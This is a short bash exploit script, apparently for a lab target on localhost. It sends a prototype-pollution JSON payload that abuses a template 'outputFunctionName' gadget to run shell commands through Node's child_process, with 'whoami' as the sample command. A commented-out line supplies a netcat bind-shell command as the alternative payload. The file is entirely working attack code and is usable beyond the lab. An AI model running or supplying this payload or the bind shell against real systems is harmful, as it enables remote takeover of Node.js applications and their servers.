#!/bin/bash

## cmd to execute
## can be a rce
# var_cmd='rm -f /tmp/f; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 6666 > /tmp/f'


curl localhost:8082 -v --data 'data={"constructor": {"prototype": {"outputFunctionName": "a; return global.process.mainModule.constructor._load(\"child_process\").execSync(\"whoami\"); //"}}}'
curl localhost:8082 -v



